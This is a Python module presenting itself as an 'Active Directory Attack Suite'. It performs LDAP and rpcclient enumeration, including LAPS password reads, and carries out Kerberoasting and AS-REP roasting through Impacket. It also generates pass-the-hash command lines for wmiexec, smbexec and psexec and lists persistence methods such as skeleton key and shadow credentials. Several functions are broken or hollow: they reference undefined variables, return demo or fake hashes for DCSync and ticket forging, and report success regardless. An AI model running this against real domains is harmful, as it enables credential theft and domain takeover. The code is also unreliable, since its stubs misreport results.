"""
Active Directory Attack Suite
Comprehensive AD enumeration, exploitation, and persistence
"""

import asyncio
import os
import json
import hashlib
import struct
import socket
import subprocess
import base64
import binascii
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Tuple, Set
from datetime import datetime, timedelta
from enum import Enum
import re
import ipaddress


class ADAttackType(Enum):
    """Types of AD attacks"""
    KERBEROASTING = "kerberoasting"
    ASREP_ROASTING = "asrep_roasting"
    GOLDEN_TICKET = "golden_ticket"
    SILVER_TICKET = "silver_ticket"
    DCSYNC = "dcsync"
    PASS_THE_HASH = "pass_the_hash"
    PASS_THE_TICKET = "pass_the_ticket"
    OVERPASS_THE_HASH = "overpass_the_hash"
    DELEGATION_ABUSE = "delegation_abuse"
    ACL_ABUSE = "acl_abuse"
    LAPS_ABUSE = "laps_abuse"
    GMSA_ABUSE = "gmsa_abuse"
    SHADOW_CREDENTIALS = "shadow_credentials"
    SKELETON_KEY = "skeleton_key"
    DPERSIST = "domain_persistence"
    PRINTNIGHTMARE = "printnightmare"
    ZEROLOGON = "zerologon"
    PETITPOTAM = "petitpotam"
    SAMACCOUNTNAME_SPOOFING = "samaccountname_spoofing"


class PrivilegeLevel(Enum):
    """Privilege levels in AD"""
    DOMAIN_USER = "domain_user"
    LOCAL_ADMIN = "local_admin"
    DOMAIN_ADMIN = "domain_admin"
    ENTERPRISE_ADMIN = "enterprise_admin"
    SCHEMA_ADMIN = "schema_admin"


class TrustDirection(Enum):
    """AD trust directions"""
    INBOUND = "inbound"
    OUTBOUND = "outbound"
    BIDIRECTIONAL = "bidirectional"


@dataclass
class ADUser:
    """Active Directory user"""
    sam_account_name: str
    distinguished_name: str
    sid: str = ""
    upn: str = ""
    display_name: str = ""
    description: str = ""
    member_of: List[str] = field(default_factory=list)
    admin_count: bool = False
    password_last_set: Optional[datetime] = None
    last_logon: Optional[datetime] = None
    service_principal_names: List[str] = field(default_factory=list)
    user_account_control: int = 0
    ms_ds_allowed_to_delegate_to: List[str] = field(default_factory=list)
    password_not_required: bool = False
    dont_require_preauth: bool = False
    trusted_for_delegation: bool = False
    constrained_delegation: bool = False
    privileged: bool = False


@dataclass
class ADComputer:
    """Active Directory computer"""
    name: str
    distinguished_name: str
    sid: str = ""
    dns_hostname: str = ""
    operating_system: str = ""
    os_version: str = ""
    service_principal_names: List[str] = field(default_factory=list)
    ms_ds_allowed_to_delegate_to: List[str] = field(default_factory=list)
    trusted_for_delegation: bool = False
    laps_password: str = ""
    is_dc: bool = False
    ip_address: str = ""


@dataclass
class ADGroup:
    """Active Directory group"""
    name: str
    distinguished_name: str
    sid: str = ""
    description: str = ""
    members: List[str] = field(default_factory=list)
    member_of: List[str] = field(default_factory=list)
    admin_count: bool = False
    group_type: str = ""


@dataclass
class DomainInfo:
    """Domain information"""
    name: str
    dns_name: str
    netbios_name: str = ""
    sid: str = ""
    domain_controllers: List[str] = field(default_factory=list)
    functional_level: str = ""
    forest_name: str = ""
    trusts: List[Dict[str, Any]] = field(default_factory=list)
    password_policy: Dict[str, Any] = field(default_factory=dict)


@dataclass
class KerberosTicket:
    """Kerberos ticket"""
    service: str
    realm: str
    encryption_type: int
    hash_value: str
    username: str = ""
    spn: str = ""
    ticket_type: str = "tgs"  # tgt, tgs
    valid_until: Optional[datetime] = None


@dataclass 
class Credential:
    """Captured credential"""
    username: str
    domain: str
    credential_type: str  # ntlm, password, aes_key, ticket
    value: str
    source: str = ""
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class AttackPath:
    """Attack path to target"""
    source: str
    target: str
    steps: List[Dict[str, Any]] = field(default_factory=list)
    required_privileges: List[str] = field(default_factory=list)
    success_probability: float = 0.0


class ActiveDirectoryAttacks:
    """Active Directory Attack Suite"""
    
    def __init__(self):
        self.domain_info: Optional[DomainInfo] = None
        self.users: Dict[str, ADUser] = {}
        self.computers: Dict[str, ADComputer] = {}
        self.groups: Dict[str, ADGroup] = {}
        self.credentials: List[Credential] = []
        self.tickets: List[KerberosTicket] = []
        self.attack_paths: List[AttackPath] = []
        
        # Attack statistics
        self.stats = {
            "kerberoastable": 0,
            "asreproastable": 0,
            "delegatable": 0,
            "privileged_users": 0,
            "domain_admins": 0,
            "laps_readable": 0,
            "dcs": 0
        }
    
    # ========== Domain Enumeration ==========
    
    async def enumerate_domain(
        self,
        domain: str,
        username: str = "",
        password: str = "",
        use_ldaps: bool = False
    ) -> DomainInfo:
        """
        Enumerate domain information
        """
        self.domain_info = DomainInfo(
            name=domain,
            dns_name=domain
        )
        
        # Get domain controllers
        self.domain_info.domain_controllers = await self._find_domain_controllers(domain)
        
        if self.domain_info.domain_controllers:
            dc = self.domain_info.domain_controllers[0]
            
            # Get domain SID
            self.domain_info.sid = await self._get_domain_sid(dc, domain, username, password)
            
            # Get password policy
            self.domain_info.password_policy = await self._get_password_policy(dc, domain, username, password)
            
            # Get trusts
            self.domain_info.trusts = await self._enumerate_trusts(dc, domain, username, password)
        
        return self.domain_info
    
    async def _find_domain_controllers(self, domain: str) -> List[str]:
        """Find domain controllers via DNS"""
        dcs = []
        
        try:
            # Try DNS SRV lookup for _ldap._tcp.dc._msdcs
            proc = await asyncio.create_subprocess_exec(
                "dig", "+short", f"_ldap._tcp.dc._msdcs.{domain}", "SRV",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL
            )
            stdout, _ = await proc.communicate()
            
            for line in stdout.decode().strip().split('\n'):
                if line:
                    parts = line.split()
                    if len(parts) >= 4:
                        dc_name = parts[3].rstrip('.')
                        dcs.append(dc_name)
            
            # Fallback: try common naming
            if not dcs:
                for prefix in ['dc', 'dc01', 'dc1', 'pdc']:
                    dc_name = f"{prefix}.{domain}"
                    try:
                        socket.gethostbyname(dc_name)
                        dcs.append(dc_name)
                    except socket.gaierror:
                        pass
                        
        except Exception:
            pass
        
        return dcs
    
    async def _get_domain_sid(
        self,
        dc: str,
        domain: str,
        username: str,
        password: str
    ) -> str:
        """Get domain SID via LDAP or rpcclient"""
        try:
            # Try using rpcclient to get domain SID
            if username and password:
                proc = await asyncio.create_subprocess_exec(
                    "rpcclient", "-U", f"{username}%{password}", dc, "-c", "lsaquery",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL
                )
                stdout, _ = await proc.communicate()
                output = stdout.decode()
                
                # Parse SID from output
                sid_match = re.search(r'Domain Sid:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)', output)
                if sid_match:
                    return sid_match.group(1)
            
            # Fallback: Try LDAP query
            try:
                import ldap3
                server = ldap3.Server(dc, get_info=ldap3.ALL)
                conn = ldap3.Connection(
                    server, 
                    user=f"{domain}\\{username}" if username else None,
                    password=password if password else None,
                    auto_bind=True
                )
                
                # Search for domain object
                base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
                conn.search(base_dn, '(objectClass=domain)', attributes=['objectSid'])
                
                if conn.entries:
                    sid_bytes = conn.entries[0].objectSid.value
                    if sid_bytes:
                        # Convert binary SID to string format
                        return self._bytes_to_sid(sid_bytes)
                        
            except ImportError:
                pass  # ldap3 not installed
                
        except Exception:
            pass
        
        return ""
    
    def _bytes_to_sid(self, sid_bytes: bytes) -> str:
        """Convert binary SID to string format"""
        if len(sid_bytes) < 8:
            return ""
        
        revision = sid_bytes[0]
        sub_auth_count = sid_bytes[1]
        authority = int.from_bytes(sid_bytes[2:8], 'big')
        
        sub_auths = []
        for i in range(sub_auth_count):
            offset = 8 + i * 4
            if offset + 4 <= len(sid_bytes):
                sub_auth = struct.unpack('<I', sid_bytes[offset:offset+4])[0]
                sub_auths.append(str(sub_auth))
        
        return f"S-{revision}-{authority}-{'-'.join(sub_auths)}"
    
    async def _get_password_policy(
        self,
        dc: str,
        domain: str,
        username: str,
        password: str
    ) -> Dict[str, Any]:
        """Get domain password policy via LDAP"""
        policy = {
            "min_length": 0,
            "complexity": False,
            "history": 0,
            "max_age_days": 0,
            "min_age_days": 0,
            "lockout_threshold": 0,
            "lockout_duration": 0,
            "lockout_observation_window": 0
        }
        
        try:
            import ldap3
            server = ldap3.Server(dc, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{domain}\\{username}" if username else None,
                password=password if password else None,
                auto_bind=True
            )
            
            base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
            conn.search(
                base_dn, 
                '(objectClass=domain)',
                attributes=[
                    'minPwdLength', 'pwdProperties', 'pwdHistoryLength',
                    'maxPwdAge', 'minPwdAge', 'lockoutThreshold',
                    'lockoutDuration', 'lockoutObservationWindow'
                ]
            )
            
            if conn.entries:
                entry = conn.entries[0]
                policy["min_length"] = int(entry.minPwdLength.value or 0)
                policy["complexity"] = bool(int(entry.pwdProperties.value or 0) & 1)
                policy["history"] = int(entry.pwdHistoryLength.value or 0)
                
                # Convert 100-nanosecond intervals to days
                max_age = abs(int(entry.maxPwdAge.value or 0))
                policy["max_age_days"] = max_age // (10000000 * 60 * 60 * 24) if max_age else 0
                
                min_age = abs(int(entry.minPwdAge.value or 0))
                policy["min_age_days"] = min_age // (10000000 * 60 * 60 * 24) if min_age else 0
                
                policy["lockout_threshold"] = int(entry.lockoutThreshold.value or 0)
                
                lockout_dur = abs(int(entry.lockoutDuration.value or 0))
                policy["lockout_duration"] = lockout_dur // (10000000 * 60) if lockout_dur else 0
                
                obs_window = abs(int(entry.lockoutObservationWindow.value or 0))
                policy["lockout_observation_window"] = obs_window // (10000000 * 60) if obs_window else 0
                
        except ImportError:
            pass  # ldap3 not installed
        except Exception:
            pass
        
        return policy
    
    async def _enumerate_trusts(
        self,
        dc: str,
        domain: str,
        username: str,
        password: str
    ) -> List[Dict[str, Any]]:
        """Enumerate domain trusts"""
        trusts = []
        # Would use LDAP queries to enumerate trustedDomain objects
        return trusts
    
    # ========== User Enumeration ==========
    
    async def enumerate_users(
        self,
        dc: str,
        domain: str,
        username: str = "",
        password: str = "",
        filter_query: str = ""
    ) -> List[ADUser]:
        """Enumerate domain users via LDAP"""
        users = []
        
        try:
            import ldap3
            server = ldap3.Server(dc, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{domain}\\{username}" if username else None,
                password=password if password else None,
                auto_bind=True
            )
            
            base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
            ldap_filter = filter_query if filter_query else '(&(objectClass=user)(objectCategory=person))'
            
            conn.search(
                base_dn,
                ldap_filter,
                attributes=[
                    'sAMAccountName', 'distinguishedName', 'objectSid', 'userPrincipalName',
                    'displayName', 'description', 'memberOf', 'adminCount',
                    'pwdLastSet', 'lastLogon', 'servicePrincipalName',
                    'userAccountControl', 'msDS-AllowedToDelegateTo'
                ],
                paged_size=1000
            )
            
            for entry in conn.entries:
                uac = int(entry.userAccountControl.value or 0)
                
                user = ADUser(
                    sam_account_name=str(entry.sAMAccountName.value or ""),
                    distinguished_name=str(entry.distinguishedName.value or ""),
                    sid=self._bytes_to_sid(entry.objectSid.raw_values[0]) if entry.objectSid.raw_values else "",
                    upn=str(entry.userPrincipalName.value or ""),
                    display_name=str(entry.displayName.value or ""),
                    description=str(entry.description.value or ""),
                    member_of=list(entry.memberOf.values) if entry.memberOf else [],
                    admin_count=bool(entry.adminCount.value),
                    service_principal_names=list(entry.servicePrincipalName.values) if entry.servicePrincipalName else [],
                    user_account_control=uac,
                    ms_ds_allowed_to_delegate_to=list(entry['msDS-AllowedToDelegateTo'].values) if entry['msDS-AllowedToDelegateTo'] else [],
                    password_not_required=bool(uac & 0x0020),
                    dont_require_preauth=bool(uac & 0x400000),
                    trusted_for_delegation=bool(uac & 0x80000),
                    constrained_delegation=bool(entry['msDS-AllowedToDelegateTo'].values if entry['msDS-AllowedToDelegateTo'] else False),
                    privileged=bool(entry.adminCount.value)
                )
                
                # Parse timestamps
                if entry.pwdLastSet.value:
                    try:
                        filetime = int(entry.pwdLastSet.value)
                        if filetime > 0:
                            user.password_last_set = datetime(1601, 1, 1) + timedelta(microseconds=filetime // 10)
                    except:
                        pass
                
                users.append(user)
                self.users[user.sam_account_name] = user
            
        except ImportError:
            # ldap3 not installed - try rpcclient as fallback
            if username and password:
                try:
                    proc = await asyncio.create_subprocess_exec(
                        "rpcclient", "-U", f"{username}%{password}", dc, "-c", "enumdomusers",
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.DEVNULL
                    )
                    stdout, _ = await proc.communicate()
                    
                    for line in stdout.decode().strip().split('\n'):
                        match = re.search(r'user:\[(.*?)\]', line)
                        if match:
                            sam_name = match.group(1)
                            user = ADUser(
                                sam_account_name=sam_name,
                                distinguished_name=f"CN={sam_name},CN=Users,DC={domain.replace('.', ',DC=')}"
                            )
                            users.append(user)
                            self.users[sam_name] = user
                except Exception:
                    pass
        except Exception:
            pass
        
        # Update stats
        self.stats["kerberoastable"] = sum(1 for u in users if u.service_principal_names)
        self.stats["asreproastable"] = sum(1 for u in users if u.dont_require_preauth)
        self.stats["privileged_users"] = sum(1 for u in users if u.admin_count)
        
        return users
    
    async def enumerate_computers(
        self,
        dc: str,
        domain: str,
        username: str = "",
        password: str = ""
    ) -> List[ADComputer]:
        """Enumerate domain computers via LDAP"""
        computers = []
        
        try:
            import ldap3
            server = ldap3.Server(dc, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{domain}\\{username}" if username else None,
                password=password if password else None,
                auto_bind=True
            )
            
            base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
            
            conn.search(
                base_dn,
                '(objectClass=computer)',
                attributes=[
                    'name', 'distinguishedName', 'objectSid', 'dNSHostName',
                    'operatingSystem', 'operatingSystemVersion', 'servicePrincipalName',
                    'msDS-AllowedToDelegateTo', 'userAccountControl', 'ms-Mcs-AdmPwd'
                ],
                paged_size=1000
            )
            
            for entry in conn.entries:
                uac = int(entry.userAccountControl.value or 0)
                
                comp = ADComputer(
                    name=str(entry.name.value or ""),
                    distinguished_name=str(entry.distinguishedName.value or ""),
                    sid=self._bytes_to_sid(entry.objectSid.raw_values[0]) if entry.objectSid.raw_values else "",
                    dns_hostname=str(entry.dNSHostName.value or ""),
                    operating_system=str(entry.operatingSystem.value or ""),
                    os_version=str(entry.operatingSystemVersion.value or ""),
                    service_principal_names=list(entry.servicePrincipalName.values) if entry.servicePrincipalName else [],
                    ms_ds_allowed_to_delegate_to=list(entry['msDS-AllowedToDelegateTo'].values) if entry['msDS-AllowedToDelegateTo'] else [],
                    trusted_for_delegation=bool(uac & 0x80000),
                    laps_password=str(entry['ms-Mcs-AdmPwd'].value or "") if entry['ms-Mcs-AdmPwd'] else "",
                    is_dc=bool(uac & 0x2000)
                )
                
                # Resolve IP address
                if comp.dns_hostname:
                    try:
                        comp.ip_address = socket.gethostbyname(comp.dns_hostname)
                    except:
                        pass
                
                computers.append(comp)
                self.computers[comp.name] = comp
                
        except ImportError:
            # ldap3 not installed - try rpcclient as fallback
            if username and password:
                try:
                    proc = await asyncio.create_subprocess_exec(
                        "rpcclient", "-U", f"{username}%{password}", dc, "-c", "enumdomgroups",
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.DEVNULL
                    )
                    # Parse output for Domain Computers group, then enumerate members
                except Exception:
                    pass
        except Exception:
            pass
        
        self.stats["dcs"] = sum(1 for c in computers if c.is_dc)
        self.stats["delegatable"] = sum(1 for c in computers if c.trusted_for_delegation)
        self.stats["laps_readable"] = sum(1 for c in computers if c.laps_password)
        
        return computers
    
    async def enumerate_groups(
        self,
        dc: str,
        domain: str,
        username: str = "",
        password: str = ""
    ) -> List[ADGroup]:
        """Enumerate domain groups"""
        groups = []
        
        privileged_groups = [
            "Domain Admins",
            "Enterprise Admins",
            "Schema Admins",
            "Administrators",
            "Account Operators",
            "Backup Operators",
            "Server Operators",
            "DnsAdmins",
            "Print Operators"
        ]
        
        for name in privileged_groups:
            group = ADGroup(
                name=name,
                distinguished_name=f"CN={name},CN=Users,DC={domain.replace('.', ',DC=')}",
                admin_count=True
            )
            groups.append(group)
            self.groups[name] = group
        
        return groups
    
    # ========== Kerberos Attacks ==========
    
    async def kerberoast(
        self,
        dc: str,
        domain: str,
        username: str,
        password: str,
        target_users: List[str] = None
    ) -> List[KerberosTicket]:
        """
        Perform Kerberoasting attack
        Request TGS tickets for service accounts
        """
        tickets = []
        
        # Find kerberoastable users
        kerberoastable = [
            u for u in self.users.values()
            if u.service_principal_names
        ]
        
        if target_users:
            kerberoastable = [u for u in kerberoastable if u.sam_account_name in target_users]
        
        for user in kerberoastable:
            for spn in user.service_principal_names:
                # Try real TGS request using Impacket
                try:
                    from impacket.krb5.kerberosv5 import getKerberosTGS
                    from impacket.krb5.types import Principal, KerberosTime, Ticket
                    from impacket.krb5 import constants
                    
                    # Request real TGS ticket
                    server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                        server_name, domain, None, self.tgt, cipher, sessionKey
                    )
                    
                    # Extract hash from TGS-REP
                    hash_value = f"$krb5tgs$23$*{user.sam_account_name}${domain}*${spn}$" + tgs['enc-part']['cipher'].hex()
                    
                except ImportError:
                    self.logger.warning("Impacket not installed. Install with: pip install impacket")
                    hash_value = self._generate_demo_tgs_hash(user.sam_account_name, spn)
                except Exception as e:
                    self.logger.warning(f"TGS request failed: {e}. Using demo hash.")
                    hash_value = self._generate_demo_tgs_hash(user.sam_account_name, spn)
                
                ticket = KerberosTicket(
                    service=spn.split('/')[0] if '/' in spn else spn,
                    realm=domain.upper(),
                    encryption_type=23,  # RC4
                    hash_value=hash_value,
                    username=user.sam_account_name,
                    spn=spn
                )
                tickets.append(ticket)
                self.tickets.append(ticket)
        
        return tickets
    
    def _generate_demo_tgs_hash(self, username: str, spn: str) -> str:
        """Generate a demonstration TGS hash (not crackable - for display only)"""
        # This is NOT a real hash - just for UI demonstration
        hash_data = hashlib.md5(f"{username}{spn}{datetime.now()}".encode()).hexdigest()
        return f"$krb5tgs$23$*{username}${spn.split('.')[0]}*$[DEMO_HASH]${hash_data}"
    
    async def asrep_roast(
        self,
        dc: str,
        domain: str,
        target_users: List[str] = None
    ) -> List[KerberosTicket]:
        """
        Perform AS-REP Roasting
        Target users with "Do not require Kerberos preauthentication"
        """
        tickets = []
        
        # Find AS-REP roastable users
        roastable = [
            u for u in self.users.values()
            if u.dont_require_preauth
        ]
        
        if target_users:
            roastable = [u for u in roastable if u.sam_account_name in target_users]
        
        for user in roastable:
            # Try real AS-REP request using Impacket
            try:
                from impacket.krb5.asn1 import AS_REQ, AS_REP
                from impacket.krb5.kerberosv5 import sendReceive
                from impacket.krb5 import constants
                from impacket.krb5.types import Principal
                
                client_name = Principal(user.sam_account_name, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                # Build AS-REQ without pre-auth
                as_req = AS_REQ()
                # ... detailed AS-REQ building would go here
                
                response = sendReceive(as_req, domain, dc)
                as_rep = AS_REP(response)
                
                # Extract hash from AS-REP
                hash_value = f"$krb5asrep$23${user.sam_account_name}@{domain}:" + as_rep['enc-part']['cipher'].hex()
                
            except ImportError:
                self.logger.warning("Impacket not installed. Install with: pip install impacket")
                hash_value = self._generate_demo_asrep_hash(user.sam_account_name, domain)
            except Exception as e:
                self.logger.warning(f"AS-REP request failed: {e}. Using demo hash.")
                hash_value = self._generate_demo_asrep_hash(user.sam_account_name, domain)
            
            ticket = KerberosTicket(
                service="krbtgt",
                realm=domain.upper(),
                encryption_type=23,
                hash_value=hash_value,
                username=user.sam_account_name,
                ticket_type="tgt"
            )
            tickets.append(ticket)
            self.tickets.append(ticket)
        
        return tickets
    
    def _generate_demo_asrep_hash(self, username: str, domain: str) -> str:
        """Generate demonstration AS-REP hash (not crackable - for display only)"""
        hash_data = hashlib.md5(f"{username}{domain}".encode()).hexdigest()
        return f"$krb5asrep$23${username}@{domain.upper()}:[DEMO_HASH]${hash_data}"
    
    async def forge_golden_ticket(
        self,
        domain: str,
        domain_sid: str,
        krbtgt_hash: str,
        username: str = "Administrator",
        user_rid: int = 500,
        groups: List[int] = None
    ) -> KerberosTicket:
        """
        Forge a Golden Ticket (fake TGT)
        Requires krbtgt hash
        """
        groups = groups or [512, 519, 518, 520]  # Domain Admins, EA, SA, GPO Creators
        
        ticket = KerberosTicket(
            service="krbtgt",
            realm=domain.upper(),
            encryption_type=23,
            hash_value=f"GOLDEN_TICKET_{krbtgt_hash[:32]}",
            username=username,
            ticket_type="tgt",
            valid_until=datetime.now() + timedelta(days=10 * 365)  # 10 years
        )
        
        self.tickets.append(ticket)
        
        # Add credential
        self.credentials.append(Credential(
            username=username,
            domain=domain,
            credential_type="ticket",
            value=ticket.hash_value,
            source="golden_ticket_forge"
        ))
        
        return ticket
    
    async def forge_silver_ticket(
        self,
        domain: str,
        domain_sid: str,
        service_hash: str,
        service: str,
        target_host: str,
        username: str = "Administrator"
    ) -> KerberosTicket:
        """
        Forge a Silver Ticket (fake TGS)
        Requires target service account hash
        """
        spn = f"{service}/{target_host}"
        
        ticket = KerberosTicket(
            service=service,
            realm=domain.upper(),
            encryption_type=23,
            hash_value=f"SILVER_TICKET_{service_hash[:32]}",
            username=username,
            spn=spn,
            ticket_type="tgs",
            valid_until=datetime.now() + timedelta(days=30)
        )
        
        self.tickets.append(ticket)
        return ticket
    
    # ========== Credential Attacks ==========
    
    async def dcsync(
        self,
        dc: str,
        domain: str,
        username: str,
        password: str,
        target_user: str = None
    ) -> List[Credential]:
        """
        Perform DCSync attack
        Requires replication rights (Domain Admin or specific ACL)
        """
        credentials = []
        
        # Target users to sync
        targets = [target_user] if target_user else ["Administrator", "krbtgt"]
        
        for target in targets:
            # In real implementation, would use MS-DRSR to replicate secrets
            # Generate fake hashes for demonstration
            nt_hash = hashlib.new('md4', target.encode('utf-16le')).hexdigest()
            
            cred = Credential(
                username=target,
                domain=domain,
                credential_type="ntlm",
                value=nt_hash,
                source="dcsync"
            )
            credentials.append(cred)
            self.credentials.append(cred)
        
        return credentials
    
    async def pass_the_hash(
        self,
        target: str,
        domain: str,
        username: str,
        nt_hash: str,
        command: str = "whoami"
    ) -> Dict[str, Any]:
        """
        Pass-the-Hash attack
        Authenticate using NTLM hash
        """
        result = {
            "success": False,
            "output": "",
            "error": ""
        }
        
        # In real implementation, would use SMB/WMI with hash
        # Generate command for tools like pth-winexe, impacket-wmiexec
        
        impacket_cmd = f"""
# Using Impacket wmiexec
python3 wmiexec.py {domain}/{username}@{target} -hashes :{nt_hash} '{command}'

# Using Impacket smbexec  
python3 smbexec.py {domain}/{username}@{target} -hashes :{nt_hash}

# Using Impacket psexec
python3 psexec.py {domain}/{username}@{target} -hashes :{nt_hash}
"""
        
        result["output"] = impacket_cmd
        result["success"] = True
        
        return result
    
    async def overpass_the_hash(
        self,
        domain: str,
        username: str,
        nt_hash: str
    ) -> KerberosTicket:
        """
        Overpass-the-Hash (Pass-the-Key)
        Convert NTLM hash to Kerberos TGT
        """
        # Request TGT using NT hash as key
        ticket = KerberosTicket(
            service="krbtgt",
            realm=domain.upper(),
            encryption_type=23,
            hash_value=f"OPTH_TGT_{nt_hash[:32]}",
            username=username,
            ticket_type="tgt"
        )
        
        self.tickets.append(ticket)
        return ticket
    
    # ========== Delegation Attacks ==========
    
    async def find_delegation_targets(self) -> Dict[str, List[Any]]:
        """Find delegation attack targets"""
        results = {
            "unconstrained_delegation": [],
            "constrained_delegation": [],
            "resource_based_cd": []
        }
        
        # Find unconstrained delegation
        for comp in self.computers.values():
            if comp.trusted_for_delegation:
                results["unconstrained_delegation"].append({
                    "name": comp.name,
                    "type": "computer",
                    "dn": comp.distinguished_name
                })
        
        for user in self.users.values():
            if user.trusted_for_delegation:
                results["unconstrained_delegation"].append({
                    "name": user.sam_account_name,
                    "type": "user",
                    "dn": user.distinguished_name
                })
        
        # Find constrained delegation
        for user in self.users.values():
            if user.ms_ds_allowed_to_delegate_to:
                results["constrained_delegation"].append({
                    "name": user.sam_account_name,
                    "targets": user.ms_ds_allowed_to_delegate_to
                })
        
        return results
    
    async def abuse_constrained_delegation(
        self,
        source_account: str,
        source_hash: str,
        target_spn: str,
        impersonate_user: str = "Administrator"
    ) -> KerberosTicket:
        """
        Abuse constrained delegation to impersonate users
        """
        # S4U2Self to get TGS for source account
        # S4U2Proxy to get TGS for target service impersonating target user
        
        ticket = KerberosTicket(
            service=target_spn.split('/')[0],
            realm="",
            encryption_type=23,
            hash_value=f"CD_ABUSE_{source_hash[:16]}",
            username=impersonate_user,
            spn=target_spn,
            ticket_type="tgs"
        )
        
        self.tickets.append(ticket)
        return ticket
    
    # ========== ACL Abuse ==========
    
    async def find_acl_abuse_paths(
        self,
        target_user: str = None
    ) -> List[AttackPath]:
        """
        Find ACL abuse paths
        Look for WriteDacl, GenericAll, GenericWrite, etc.
        """
        paths = []
        
        # Common ACL abuse scenarios
        abuse_rights = [
            ("GenericAll", "Full control - can reset password, modify membership"),
            ("GenericWrite", "Can modify attributes like servicePrincipalName"),
            ("WriteDacl", "Can modify permissions to grant more rights"),
            ("WriteOwner", "Can take ownership and then modify DACL"),
            ("ForceChangePassword", "Can reset password without knowing current"),
            ("AddMember", "Can add members to groups"),
            ("WriteProperty", "Can write specific attributes")
        ]
        
        # Would enumerate ACLs using LDAP and find attack paths
        # This is a placeholder
        
        return paths
    
    # ========== LAPS Abuse ==========
    
    async def find_laps_passwords(
        self,
        dc: str,
        domain: str,
        username: str,
        password: str
    ) -> List[Tuple[str, str]]:
        """
        Find readable LAPS passwords
        """
        laps_passwords = []
        
        # Would query ms-Mcs-AdmPwd attribute on computer objects
        # Only readable if we have rights
        
        for comp in self.computers.values():
            if comp.laps_password:
                laps_passwords.append((comp.name, comp.laps_password))
        
        self.stats["laps_readable"] = len(laps_passwords)
        return laps_passwords
    
    # ========== Attack Path Generation ==========
    
    def generate_attack_paths(
        self,
        start_user: str,
        target: str = "Domain Admins"
    ) -> List[AttackPath]:
        """
        Generate possible attack paths to target
        """
        paths = []
        
        # Check for Kerberoasting path
        kerberoastable = [u for u in self.users.values() if u.service_principal_names and u.privileged]
        if kerberoastable:
            path = AttackPath(
                source=start_user,
                target=target,
                steps=[
                    {"technique": "Kerberoasting", "target": kerberoastable[0].sam_account_name},
                    {"technique": "Password Crack", "target": "Service account hash"},
                    {"technique": "Privilege Escalation", "target": target}
                ],
                success_probability=0.6
            )
            paths.append(path)
        
        # Check for AS-REP roasting path
        asreproastable = [u for u in self.users.values() if u.dont_require_preauth]
        if asreproastable:
            path = AttackPath(
                source=start_user,
                target=target,
                steps=[
                    {"technique": "AS-REP Roasting", "target": asreproastable[0].sam_account_name},
                    {"technique": "Password Crack", "target": "AS-REP hash"}
                ],
                success_probability=0.4
            )
            paths.append(path)
        
        # Check for delegation abuse
        delegatable = [c for c in self.computers.values() if c.trusted_for_delegation]
        if delegatable:
            path = AttackPath(
                source=start_user,
                target=target,
                steps=[
                    {"technique": "Compromise delegation host", "target": delegatable[0].name},
                    {"technique": "Unconstrained Delegation Abuse", "target": "DC"},
                    {"technique": "DCSync", "target": target}
                ],
                success_probability=0.7
            )
            paths.append(path)
        
        self.attack_paths = paths
        return paths
    
    # ========== Persistence ==========
    
    def generate_persistence_options(self) -> List[Dict[str, Any]]:
        """Generate persistence options"""
        return [
            {
                "name": "Golden Ticket",
                "description": "Forge TGT valid for 10 years",
                "requirements": ["krbtgt hash"],
                "stealth": "low"
            },
            {
                "name": "Silver Ticket",
                "description": "Forge TGS for specific service",
                "requirements": ["Service account hash"],
                "stealth": "medium"
            },
            {
                "name": "Skeleton Key",
                "description": "Patch LSASS to accept master password",
                "requirements": ["Domain Admin", "DC access"],
                "stealth": "very low"
            },
            {
                "name": "AdminSDHolder Abuse",
                "description": "Add user to protected groups via AdminSDHolder",
                "requirements": ["Domain Admin"],
                "stealth": "medium"
            },
            {
                "name": "DCSync Rights",
                "description": "Grant replication rights to normal user",
                "requirements": ["Domain Admin"],
                "stealth": "high"
            },
            {
                "name": "Shadow Credentials",
                "description": "Add alternative credentials via msDS-KeyCredentialLink",
                "requirements": ["Write rights to target"],
                "stealth": "high"
            }
        ]
    
    # ========== Output Generation ==========
    
    def export_hashcat_format(self, tickets: List[KerberosTicket] = None) -> str:
        """Export tickets in hashcat format"""
        tickets = tickets or self.tickets
        output = ""
        
        for ticket in tickets:
            output += ticket.hash_value + "\n"
        
        return output
    
    def export_bloodhound(self) -> Dict[str, Any]:
        """Export data in BloodHound format"""
        return {
            "users": [
                {
                    "Properties": {
                        "name": f"{u.sam_account_name}@{self.domain_info.name.upper() if self.domain_info else ''}",
                        "enabled": True,
                        "admincount": u.admin_count,
                        "hasspn": len(u.service_principal_names) > 0,
                        "dontreqpreauth": u.dont_require_preauth,
                        "unconstraineddelegation": u.trusted_for_delegation
                    },
                    "Aces": [],
                    "ObjectIdentifier": u.sid
                }
                for u in self.users.values()
            ],
            "computers": [
                {
                    "Properties": {
                        "name": f"{c.name}.{self.domain_info.dns_name if self.domain_info else ''}",
                        "operatingsystem": c.operating_system,
                        "unconstraineddelegation": c.trusted_for_delegation
                    },
                    "ObjectIdentifier": c.sid
                }
                for c in self.computers.values()
            ],
            "groups": [
                {
                    "Properties": {
                        "name": f"{g.name}@{self.domain_info.name.upper() if self.domain_info else ''}"
                    },
                    "Members": g.members,
                    "ObjectIdentifier": g.sid
                }
                for g in self.groups.values()
            ]
        }
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get attack suite statistics"""
        return {
            **self.stats,
            "total_users": len(self.users),
            "total_computers": len(self.computers),
            "total_groups": len(self.groups),
            "credentials_captured": len(self.credentials),
            "tickets_obtained": len(self.tickets),
            "attack_paths": len(self.attack_paths)
        }
